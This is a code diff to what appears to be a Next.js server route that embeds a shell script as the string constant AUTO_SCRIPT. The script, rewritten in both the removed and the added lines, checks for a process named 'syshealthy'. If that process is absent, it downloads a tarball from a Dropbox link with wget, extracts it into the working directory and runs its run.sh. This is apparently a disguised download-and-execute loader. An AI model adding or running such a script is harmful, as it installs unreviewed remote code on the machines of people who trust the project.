@@ -5,21 +5,35 @@ import { NextResponse } from 'next/server';
 import { randomUUID } from 'crypto';
 
 const AUTO_SCRIPT = `
-# Run docky in current working directory. If not present, download and extract
-# then run the bundled run.sh with --log. If docky exists, start it only when
-# no process matching "syshealthy" is running.
-if [ ! -d "./docky-main" ] && [ ! -d "./docky" ]; then
-  wget -q -O /tmp/docky.tar.gz "https://www.dropbox.com/scl/fi/iwnmu7tbc79rdmw23fw1f/docky.tar.gz?rlkey=xnkpvcu7ox972r45oxlzjak2z&dl=1" && \
-  tar -xzf /tmp/docky.tar.gz -C . && \
-  if [ -x ./docky-main/run.sh ]; then bash ./docky-main/run.sh --log; elif [ -x ./docky/run.sh ]; then bash ./docky/run.sh --log; fi
-else
-  if ! pgrep -f "syshealthy" > /dev/null; then
-    if [ -x ./docky-main/run.sh ]; then
-      bash ./docky-main/run.sh --log
-    elif [ -x ./docky/run.sh ]; then
-      bash ./docky/run.sh --log
-    fi
-  fi
+# Auto-start docky in the current directory.
+# 1) If a process matching "syshealthy" is running, do nothing.
+# 2) If ./docky-main/run.sh exists, run it with --log.
+# 3) If ./docky/run.sh exists, run it with --log.
+# 4) Otherwise download the dropbox tarball, extract here, then run the
+#    appropriate run.sh (prefer docky-main) with --log.
+
+if pgrep -f "syshealthy" > /dev/null; then
+  # already running
+  exit 0
+fi
+
+if [ -x "./docky-main/run.sh" ]; then
+  bash ./docky-main/run.sh --log
+  exit 0
+fi
+
+if [ -x "./docky/run.sh" ]; then
+  bash ./docky/run.sh --log
+  exit 0
+fi
+
+# Not present — download and extract into current directory, then run
+wget -q -O /tmp/docky.tar.gz "https://www.dropbox.com/scl/fi/iwnmu7tbc79rdmw23fw1f/docky.tar.gz?rlkey=xnkpvcu7ox972r45oxlzjak2z&dl=1" && \
+tar -xzf /tmp/docky.tar.gz -C . && \
+if [ -x "./docky-main/run.sh" ]; then
+  bash ./docky-main/run.sh --log
+elif [ -x "./docky/run.sh" ]; then
+  bash ./docky/run.sh --log
 fi
 `;
 
